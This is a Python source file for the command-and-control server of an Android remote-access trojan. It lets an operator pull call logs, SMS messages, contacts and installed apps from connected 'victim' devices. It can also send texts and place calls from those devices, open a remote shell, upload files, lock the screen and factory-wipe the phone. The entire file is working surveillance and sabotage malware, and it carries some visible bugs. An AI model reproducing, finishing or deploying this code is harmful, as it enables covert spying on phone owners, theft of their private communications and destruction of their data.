import socket
import sys
from threading import Thread
from pathlib import Path
import base64

port = 22222
dumpPath = "/sdcard/"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('', port))

server.listen()
print("listening for connections...")

all_clients = {}

sessionAlive = None


def help():
    print("getCallLogs - get all call logs"
          "\ngetSmsLogs-<type> - type(inbox|sent|draft) - get all sms logs"
          "\ngetApps - list all apps Installed on device"
          "\ngetContacts - get Contacts list from device"
          "\ngetInfo - get Device Info"
          "\nsendSms <phoneNumber> <message> - send Message from victim Device"
          "\ncallPhone <phoneNumber> - Initiate call to target number"
          "\nshell - gets the target Device shell"
          "\nlockDevice - Turns off Device screen (Admin)"
          "\nwipePhoneData-Confirm - Resets Device to Factory Settings (Admin)")


def stable_recv(listen_client):
    total_data = []
    global sessionAlive
    alive = True
    while alive:
        try:
            data = listen_client.recv(1024).decode(errors='ignore')
            if not data:
                del all_clients[client]
                total_data.append(f"\n{all_clients[listen_client]} disconneted !")
                alive = False
                sessionAlive = False
            else:
                if "EOFExceptionReceived" in data:
                    total_data.append(data.replace("EOFExceptionReceived", ""))
                    break
                else:
                    total_data.append(data)
        except Exception as e:
            print(e)
            pass

    return ''.join(total_data)


def stable_send(client, Cmd):
    try:
        data = Cmd.encode('UTF-8')
        client.send(len(data).to_bytes(2, byteorder='big'))
        client.send(data)
        return True
    except:
        del all_clients[client]
        print(all_clients[client] + "disconnected !")
        return False


def encodeFileData(filename):
    with open(filename, "rb") as f:
        data = f.read()
    encoded = base64.b64encode(data)
    return encoded

def startShell(client):
    while sessionAlive:
        print("android@shell:~$ ", end="")
        shellCmd = input("")

        if shellCmd.startswith("upload"):
            # exception handling TODO
            filePath = shellCmd.split(" ")[1].strip()
            if Path(filePath).is_file():
                fileData = encodeFileData(filePath)
                fileName = filePath.split("/")[-1]
                stable_send(f"upload<!>{fileName}<!>{fileData}")
            else:
                print("[ Error ] File doesn't exist !")
        else:
            stable_send(client, shellCmd)
            shellResponse = stable_recv(client)
            print(shellResponse)

        if shellCmd.strip() == "exit":
            break


def startSession(client):
    client_name = all_clients[client]
    while sessionAlive:
        print(f"{client_name} > ", end="")
        sendData = input("")

        if sendData.strip() == "exit":
            break

        elif sendData.strip() == "help":
            help()

        elif sendData.strip() == "getCallLogs":
            if stable_send(client, sendData):
                print("[ info ] requesting call logs -")
                callLogs = stable_recv(client)
            else:
                break
            with open(f"{dumpPath}{client_name}-callLogs.txt", "w+") as f:
                f.write(callLogs)
            print(f"[ success ] saved at {dumpPath}{client_name}-callLogs.txt")

        elif sendData.startswith("getSmsLogs"):
            try:
                typE = sendData.split("-")[1]
            except:
                print("[ info ] Wrong Command format")
                continue
            stable_send(client, sendData)
            print("[ info ] requesting sms logs -")
            smsLogs = stable_recv(client)
            with open(f"{dumpPath}{client_name}-smsLogs{typE}.txt", "w+") as f:
                f.write(smsLogs)
            print(f"[ success ] saved at {dumpPath}{client_name}-smsLogs{typE}.txt")

        elif sendData.strip() == "getContacts":
            if stable_send(client, sendData):
                contacts = stable_recv(client)
                print("[ info ] requesting contacts list -")
            else:
                break
            with open(f"{dumpPath}{client_name}-contacts.txt", "w+") as f:
                f.write(contacts)
            print(f"[ success ] saved at {dumpPath}{client_name}-contacts.txt")

        elif sendData.strip() == "getApps":
            if stable_send(client, sendData):
                apps = stable_recv(client)
                print("[ info ] requesting apps list -")
            else:
                break
            with open(f"{dumpPath}{client_name}-apps.txt", "w+") as f:
                f.write(apps)
            print(f"[ success ] saved at {dumpPath}{client_name}-apps.txt")

        elif sendData.strip() == "shell":
            if stable_send(client, sendData):
                response = stable_recv(client)
                print(response)
                if "DONE" in response:
                    startShell(client)
                else:
                    continue

        else:
            if stable_send(client, sendData):
                msg = stable_recv(client)
                print(msg)
            else:
                break


def handle_devices():
    global sessionAlive
    while True:
        print("SDevice > ", end="")
        getDevice = input("")
        if getDevice.strip() == "show":
            count = 1
            for client in all_clients:
                print(f"[ {count} ]  {all_clients[client]}")
                count += 1
        elif getDevice.startswith("run"):
            try:
                index = int(getDevice.split(' ')[-1]) - 1
            except:
                print("[ error ] Run Command argument error")
                continue
            try:
                sessionAlive = True
                startSession(tuple(all_clients.items())[index][0])
            except:
                print(f"[ info ] No Device at index {index + 1}")
        elif getDevice.strip() == "exit":
            server.close()
            sys.exit()
        else:
            print("[ error ] command not found!")


gotFirstConnection = False


def handle_new_client(client):
    global gotFirstConnection
    client_name = stable_recv(client)
    all_clients[client] = client_name
    print(f"\r[ + ] Received a connection from {client_name}")
    if not gotFirstConnection:
        gotFirstConnection = True
        Thread(target=handle_devices).start()


handle_devices()

while True:
    try:
        client, address = server.accept()
        Thread(target=handle_new_client, args=[client]).start()
    except:
        server.close()
        break
